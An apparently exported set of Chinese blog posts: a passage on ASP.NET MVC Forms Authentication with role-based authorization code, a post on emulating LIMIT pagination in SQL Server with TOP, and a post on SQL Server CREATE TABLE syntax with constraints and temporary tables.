<p>可以启用 Forms Authentication。</p>
<p>当前项目的配置节如下所示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">system.web</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">authentication</span> <span class="attr">mode</span>=<span class="string">&quot;Forms&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">forms</span></span></span><br><span class="line"><span class="tag">      <span class="attr">loginUrl</span>=<span class="string">&quot;~/Account/LogOn&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">defaultUrl</span>=<span class="string">&quot;~/Home/Index&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">protection</span>=<span class="string">&quot;All&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">authentication</span>&gt;</span></span><br><span class="line">  ...... ......</span><br><span class="line"><span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>loginUrl：表示登录页面的连接，如果在未登录(授权)的状态下访问需要权限的页面，则跳转到~&#x2F;Account&#x2F;LogOn</li>
<li>defaultUrl：登陆后默认跳转的页面</li>
<li>protection：表示对哪些页面生效</li>
</ul>
<h2 id="（4）修改-Global-asax"><a href="#（4）修改-Global-asax" class="headerlink" title="（4）修改 Global.asax"></a>（4）修改 Global.asax</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">WebApplication1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MvcApplication</span> : <span class="title">System.Web.HttpApplication</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">Application_Start</span>()<span class="comment">/*默认的配置*/</span></span></span><br><span class="line">        &#123;</span><br><span class="line">            AreaRegistration.RegisterAllAreas();</span><br><span class="line">            FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);</span><br><span class="line">            RouteConfig.RegisterRoutes(RouteTable.Routes);</span><br><span class="line">            BundleConfig.RegisterBundles(BundleTable.Bundles);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//此方式将用户的角色保存至用户 Cookie，使用到了 FormsAuthenticationTicket。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 添加构造函数</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MvcApplication</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            AuthorizeRequest += <span class="keyword">new</span> EventHandler(MvcApplication_AuthorizeRequest);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//权限请求</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">MvcApplication_AuthorizeRequest</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> id = Context.User.Identity <span class="keyword">as</span> FormsIdentity;</span><br><span class="line">            <span class="keyword">if</span> (id != <span class="literal">null</span> &amp;&amp; id.IsAuthenticated)<span class="comment">//这里判断访问者是否成功进行了身份验证</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//通过逗号分割，多个权限</span></span><br><span class="line">                <span class="keyword">var</span> roles = id.Ticket.UserData.Split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">                <span class="comment">//得到请求</span></span><br><span class="line">                Context.User = <span class="keyword">new</span> GenericPrincipal(id, roles);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="（5）Controller-控制器"><a href="#（5）Controller-控制器" class="headerlink" title="（5）Controller 控制器"></a>（5）Controller 控制器</h2><h3 id="AccountController"><a href="#AccountController" class="headerlink" title="AccountController"></a>AccountController</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AccountController</span> : <span class="title">Controller</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> UserRepository repository = <span class="keyword">new</span> UserRepository();</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> ActionResult <span class="title">LogOn</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> View();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">HttpPost</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> ActionResult <span class="title">LogOnss</span>(<span class="params">LogOnModel model</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//if (ModelState.IsValid)</span></span><br><span class="line">            <span class="comment">//&#123;</span></span><br><span class="line">                <span class="comment">//找用户</span></span><br><span class="line">                User user = repository.GetByNameAndPassword(model.UserName, model.Password);</span><br><span class="line">                <span class="comment">//找到</span></span><br><span class="line">                <span class="keyword">if</span> (user != <span class="literal">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="comment">//提供对Form的身份验证用于确定用户身份</span></span><br><span class="line">                    FormsAuthenticationTicket ticket = <span class="keyword">new</span> FormsAuthenticationTicket(</span><br><span class="line">                        <span class="number">1</span>,          <span class="comment">//版本</span></span><br><span class="line">                        user.Name,  <span class="comment">//名称</span></span><br><span class="line">                        DateTime.Now,<span class="comment">//发行时间</span></span><br><span class="line">                        DateTime.Now.Add(FormsAuthentication.Timeout),<span class="comment">//到期时间</span></span><br><span class="line">                        model.RememberMe,<span class="comment">//持久化</span></span><br><span class="line">                        user.Roles.Aggregate((i, j) =&gt; i + <span class="string">&quot;,&quot;</span> + j)<span class="comment">//特定于用户的数据</span></span><br><span class="line">                        );</span><br><span class="line">                    HttpCookie cookie = <span class="keyword">new</span> HttpCookie(<span class="comment">//创建cookie</span></span><br><span class="line">                        FormsAuthentication.FormsCookieName,<span class="comment">//name</span></span><br><span class="line">                        FormsAuthentication.Encrypt(ticket));<span class="comment">//value</span></span><br><span class="line">                cookie.Expires = DateTime.Now.AddSeconds(<span class="number">10</span>);<span class="comment">//十秒钟过期</span></span><br><span class="line">                    Response.Cookies.Add(cookie);<span class="comment">//添加cookie</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">//if (!String.IsNullOrEmpty(returnUrl)) return Redirect(returnUrl);else</span></span><br><span class="line">                <span class="keyword">return</span> RedirectToAction(<span class="string">&quot;Index&quot;</span>, <span class="string">&quot;Home&quot;</span>);<span class="comment">//登录成功后跳转</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    ModelState.AddModelError(<span class="string">&quot;&quot;</span>, <span class="string">&quot;用户名或密码不正确！&quot;</span>);</span><br><span class="line">            <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> Content(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> ActionResult <span class="title">LogOff</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            FormsAuthentication.SignOut();</span><br><span class="line">            <span class="keyword">return</span> RedirectToAction(<span class="string">&quot;Index&quot;</span>, <span class="string">&quot;Home&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="HomeController"><a href="#HomeController" class="headerlink" title="HomeController"></a>HomeController</h3><p>权限放在了 User 表 Roles 字段中，可以在 UserRepository 中修改其值。</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">HomeController</span> : <span class="title">Controller</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//有一种权限即可登录employee or manager</span></span><br><span class="line">        [<span class="meta">Authorize(Roles = <span class="string">&quot;employee,manager&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> ActionResult <span class="title">Index</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> View();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//admin权限</span></span><br><span class="line">        [<span class="meta">Authorize(Roles = <span class="string">&quot;admin&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> ActionResult <span class="title">About</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            ViewBag.Message = <span class="string">&quot;Your application description page.&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> View();</span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="meta">Authorize(Roles = <span class="string">&quot;employee&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> ActionResult <span class="title">Contact</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            ViewBag.Message = <span class="string">&quot;Your contact page.&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> View();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="三、Views-下面的视图"><a href="#三、Views-下面的视图" class="headerlink" title="三、Views 下面的视图"></a>三、Views 下面的视图</h1><p>LogOn.cshtml</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;well well-sm&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:700px;margin-left:200px&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal-body&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-6 col-md-offset-3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;width:700px;margin-left:50px&quot;</span>&gt;</span>账 户 登 录<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/Account/LogOnss&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span>name<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;UserName&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span>password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">            <span class="attr">value</span>=<span class="string">&quot;登          录&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">&quot;width:420px&quot;</span></span></span><br><span class="line"><span class="tag">          /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><h3 id="MVC-身份验证及权限管理"><a href="#MVC-身份验证及权限管理" class="headerlink" title="MVC 身份验证及权限管理"></a><a href="https://www.cnblogs.com/asks/p/4372783.html">MVC 身份验证及权限管理</a></h3><h3 id="ASP-NET-MVC-中的-Global-asax-文件"><a href="#ASP-NET-MVC-中的-Global-asax-文件" class="headerlink" title=" ASP.NET MVC 中的 Global.asax 文件"></a><a href="https://www.cnblogs.com/lgxlsm/p/5573088.html"> ASP.NET MVC 中的 Global.asax 文件</a></h3><h3 id="MVC-身份验证及权限管理-1"><a href="#MVC-身份验证及权限管理-1" class="headerlink" title="MVC 身份验证及权限管理"></a><a href="https://www.cnblogs.com/jin-/p/9688732.html">MVC 身份验证及权限管理</a></h3>]]></content>
      <categories>
        <category>.NET</category>
      </categories>
      <tags>
        <tag>.NET</tag>
      </tags>
  </entry>
  <entry>
    <title>Sql Server使用TOP实现Limit m,n的功能</title>
    <url>/2021/05/15/SQL%20Server%E4%BD%BF%E7%94%A8TOP%E5%AE%9E%E7%8E%B0Limit%20m,n%E7%9A%84%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<p>在 MySQL 中，可以用 Limit 来查询第 m 列到第 n 列的记录，例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [tablename] limit [m], [n]</span><br></pre></td></tr></table></figure>

<p>但是，在 SQL Server 中，不支持 Limit 语句。怎么办呢？<br>解决方案：<br>虽然 SQL Server 不支持 Limit ，但是它支持 TOP。</p>
<p>例如，如果要查询上述结果中前 6 条记录，则相应的 SQL 语句是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">6</span> [columnNames..] <span class="keyword">from</span> [tablename]</span><br></pre></td></tr></table></figure>

<p>如果要查询上述结果中第 7 条到第 9 条记录，则相应的 SQL 语句是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">3</span> [columnNames..] <span class="keyword">from</span> [tablename]</span><br><span class="line"><span class="keyword">where</span> [columnNames..] <span class="keyword">not</span> <span class="keyword">in</span> (</span><br><span class="line">    <span class="keyword">select</span> top <span class="number">6</span> [columnNames..] <span class="keyword">from</span> [tablename]</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>取第 m 条到第 n 条记录：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top (n<span class="operator">-</span>m<span class="operator">+</span><span class="number">1</span>) [columnNames..] <span class="keyword">from</span> [tablename]</span><br><span class="line"><span class="keyword">where</span> [columnNames..] <span class="keyword">not</span> <span class="keyword">in</span> (</span><br><span class="line">    <span class="keyword">select</span> top (m<span class="number">-1</span>) [columnNames..] <span class="keyword">from</span> [tablename]</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="variable">@pageSize</span> [columnNames..] <span class="keyword">from</span> [tablename]</span><br><span class="line"><span class="keyword">where</span> [columnNames..] <span class="keyword">not</span> <span class="keyword">in</span> (</span><br><span class="line">    <span class="keyword">select</span> top <span class="variable">@offset</span> [columnNames..] <span class="keyword">from</span> [tablename]</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL Server创建表语句</title>
    <url>/2021/03/17/SQL%20Server%E5%88%9B%E5%BB%BA%E8%A1%A8%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<h1 id="SQL-Server-创建表语句"><a href="#SQL-Server-创建表语句" class="headerlink" title="SQL Server 创建表语句"></a>SQL Server 创建表语句</h1><p>参考：</p>
<p><a href="https://www.w3school.com.cn/sql/sql_create_table.asp">SQL CREATE TABLE 语句</a><br><a href="https://blog.csdn.net/kepa520/article/details/78793431">SQL Server 创建表语句介绍</a></p>
<h2 id="一、基本实例"><a href="#一、基本实例" class="headerlink" title="一、基本实例"></a>一、基本实例</h2><p>SQL Server 创建表是最常见也是最常用的操作之一，下面就为您介绍 SQL Server 创建表的语句写法，供您参考，希望可以让您对 SQL Server 创建表方面有更深的认识。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">USE suntest</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 仓库</span><br><span class="line">(</span><br><span class="line">仓库编号 <span class="type">int</span> ,</span><br><span class="line">仓库号 <span class="type">varchar</span>(<span class="number">50</span>) ,</span><br><span class="line">城市 <span class="type">varchar</span>(<span class="number">50</span>) ,</span><br><span class="line">面积 <span class="type">int</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 仓库<span class="number">1</span></span><br><span class="line">(</span><br><span class="line">仓库编号 <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> ,</span><br><span class="line">仓库号 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">城市 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="keyword">null</span>, <span class="comment">--不能为空not null--</span></span><br><span class="line">面积 <span class="type">int</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 仓库<span class="number">2</span></span><br><span class="line">(</span><br><span class="line">仓库编号 <span class="type">int</span> <span class="keyword">primary</span> key , <span class="comment">--主键的关键字primary key--</span></span><br><span class="line">仓库号 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">unique</span>, <span class="comment">--唯一索引关键字unique--</span></span><br><span class="line">城市 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="keyword">null</span>, <span class="comment">--不能为空not null--</span></span><br><span class="line">面积 <span class="type">int</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 仓库<span class="number">3</span></span><br><span class="line">(</span><br><span class="line">仓库编号 <span class="type">int</span> <span class="keyword">primary</span> key , <span class="comment">--主键的关键字primary key--</span></span><br><span class="line">仓库号 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">unique</span>, <span class="comment">--唯一索引关键字unique--</span></span><br><span class="line">城市 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">default</span> <span class="string">&#x27;青岛&#x27;</span>, <span class="comment">--不能为空not null--</span></span><br><span class="line">面积 <span class="type">int</span> <span class="keyword">check</span> (面积<span class="operator">&gt;=</span><span class="number">300</span> <span class="keyword">and</span> 面积<span class="operator">&lt;=</span><span class="number">1800</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 职工表</span><br><span class="line">(</span><br><span class="line">职工编号 <span class="type">int</span> <span class="keyword">identity</span> (<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">primary</span> key,</span><br><span class="line">职工号 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">unique</span>,</span><br><span class="line">仓库号 <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">工资 <span class="type">int</span> <span class="keyword">check</span>(基本工资<span class="operator">&gt;=</span><span class="number">800</span> <span class="keyword">and</span> 基本工资<span class="operator">&lt;=</span><span class="number">2100</span>),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 订单表</span><br><span class="line">(</span><br><span class="line">订单编号 <span class="type">int</span> <span class="keyword">identity</span>(<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">primary</span> key,</span><br><span class="line">订单号 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">unique</span>,</span><br><span class="line">职工号 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">references</span> 职工表(职工号),<span class="comment">--references两张表通过“职工号”关联--</span></span><br><span class="line">订购日期 datetime,</span><br><span class="line">销售金额 <span class="type">int</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 阳光工资表</span><br><span class="line">(</span><br><span class="line">职工编号 <span class="type">int</span> <span class="keyword">identity</span> (<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">primary</span> key,</span><br><span class="line">职工号 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">unique</span>,</span><br><span class="line">仓库号 <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">基本工资 <span class="type">int</span> <span class="keyword">check</span>(基本工资<span class="operator">&gt;=</span><span class="number">800</span> <span class="keyword">and</span> 基本工资<span class="operator">&lt;=</span><span class="number">2100</span>),</span><br><span class="line">加班工资 <span class="type">int</span>,</span><br><span class="line">奖金 <span class="type">int</span>,</span><br><span class="line">扣率 <span class="type">int</span>,</span><br><span class="line">应发工资 <span class="keyword">as</span> (基本工资<span class="operator">+</span>加班工资<span class="operator">+</span>奖金<span class="operator">-</span>扣率) <span class="comment">--as为自动计算字段，不能输入值--</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="二、详细划分"><a href="#二、详细划分" class="headerlink" title="二、详细划分"></a>二、详细划分</h2><h3 id="1：临时表"><a href="#1：临时表" class="headerlink" title="1：临时表"></a>1：临时表</h3><p>在 sql 语句中，临时表有两类，分别是局部(local)和全局(global)临时表，局部临时表只在其会话（事务)中可见，全局临时表可以被会话(事务)中的任何程序或者模块访问</p>
<h3 id="2：创建局部临时表"><a href="#2：创建局部临时表" class="headerlink" title="2：创建局部临时表"></a>2：创建局部临时表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver</span><br><span class="line">go</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> #db_local_table</span><br><span class="line">(</span><br><span class="line">  id  <span class="type">int</span>,</span><br><span class="line">  name <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">  age <span class="type">int</span>,</span><br><span class="line">  area <span class="type">int</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>创建的临时表不能与其他会话共享，当会话结束时，行和表的定义都将被删除</p>
<h3 id="3：创建全局临时表"><a href="#3：创建全局临时表" class="headerlink" title="3：创建全局临时表"></a>3：创建全局临时表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver</span><br><span class="line">go</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> ##db_local_table</span><br><span class="line">(</span><br><span class="line">  id  <span class="type">int</span>,</span><br><span class="line">  name <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">  age <span class="type">int</span>,</span><br><span class="line">  area <span class="type">int</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>全局临时表对所有用户都是可见的，在每个访问该表的用户都断开服务器连接时，全局临时表才会被删除</p>
<h3 id="4：创建主键、外键关联的数据库表"><a href="#4：创建主键、外键关联的数据库表" class="headerlink" title="4：创建主键、外键关联的数据库表"></a>4：创建主键、外键关联的数据库表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> db_table5</span><br><span class="line">(</span><br><span class="line">  职工编号 <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">  职工号  <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">unique</span>,</span><br><span class="line">  仓库号  <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">  工资   <span class="type">int</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">go</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> db_table6</span><br><span class="line">(</span><br><span class="line">  订单编号 <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">  订单号  <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">unique</span>,</span><br><span class="line">  职工号 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">references</span> db_table5(职工号),</span><br><span class="line">  订购日期 datetime,</span><br><span class="line">  销售金额 <span class="type">int</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="5：创建具有-check-约束字段的数据库表"><a href="#5：创建具有-check-约束字段的数据库表" class="headerlink" title="5：创建具有 check 约束字段的数据库表"></a>5：创建具有 check 约束字段的数据库表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> db_table7</span><br><span class="line">(</span><br><span class="line">  仓库编号 <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">  职工号  <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">unique</span>,</span><br><span class="line">  仓库号  <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">  工资   <span class="type">int</span>,</span><br><span class="line">  面积  <span class="type">int</span> <span class="keyword">check</span>(面积<span class="operator">&gt;=</span><span class="number">600</span> <span class="keyword">and</span> 面积<span class="operator">&lt;=</span><span class="number">1800</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="6：创建含有计算字段的数据库表"><a href="#6：创建含有计算字段的数据库表" class="headerlink" title="6：创建含有计算字段的数据库表"></a>6：创建含有计算字段的数据库表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> db_table8</span><br><span class="line">(</span><br><span class="line">  职工编号 <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">  职工号 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">unique</span>,</span><br><span class="line">  仓库号 <span class="type">varchar</span>(<span class="number">50</span>),</span><br><span class="line">  基本工资 <span class="type">int</span> <span class="keyword">check</span>(基本工资<span class="operator">&gt;=</span><span class="number">800</span> <span class="keyword">and</span> 基本工资<span class="operator">&lt;=</span><span class="number">2100</span>),</span><br><span class="line">  加班工资 <span class="type">int</span>,</span><br><span class="line">  奖金 <span class="type">int</span>,</span><br><span class="line">  扣率 <span class="type">int</span>,</span><br><span class="line">  应发工资 <span class="keyword">as</span> (基本工资 <span class="operator">+</span> 加班工资 <span class="operator">+</span> 奖金 <span class="operator">-</span> 扣率)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="7：创建含有自动编号字段的数据库表"><a href="#7：创建含有自动编号字段的数据库表" class="headerlink" title="7：创建含有自动编号字段的数据库表"></a>7：创建含有自动编号字段的数据库表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> db_table9</span><br><span class="line">(</span><br><span class="line">   仓库编号 <span class="type">int</span> <span class="keyword">identity</span>(<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">primary</span> key,</span><br><span class="line">   仓库号 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">unique</span>,</span><br><span class="line">   城市 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">default</span>(<span class="string">&#x27;青岛&#x27;</span>),</span><br><span class="line">   面积 <span class="type">int</span> <span class="keyword">check</span>(面积<span class="operator">&gt;=</span><span class="number">300</span> <span class="keyword">and</span> 面积<span class="operator">&lt;=</span><span class="number">1800</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>向表中添加记录：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> [db_sqlserver].[dbo].[db_table9](仓库号, 面积) <span class="keyword">values</span>(<span class="string">&#x27;400&#x27;</span>, <span class="number">1600</span>);</span><br></pre></td></tr></table></figure>

<p>仓库编号会自动增加</p>
<h3 id="8：创建含有排序字段的数据表"><a href="#8：创建含有排序字段的数据表" class="headerlink" title="8：创建含有排序字段的数据表"></a>8：创建含有排序字段的数据表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> db_table10</span><br><span class="line">(</span><br><span class="line">   仓库编号 <span class="type">int</span> <span class="keyword">identity</span>(<span class="number">1</span>, <span class="number">1</span>) <span class="keyword">primary</span> key,</span><br><span class="line">   仓库号 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">collate</span> french_CI_AI <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">   城市 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">default</span> <span class="string">&#x27;青岛&#x27;</span>,</span><br><span class="line">   面积 <span class="type">int</span> <span class="keyword">check</span>(面积<span class="operator">&gt;=</span><span class="number">300</span> <span class="keyword">and</span> 面积<span class="operator">&lt;=</span><span class="number">1800</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

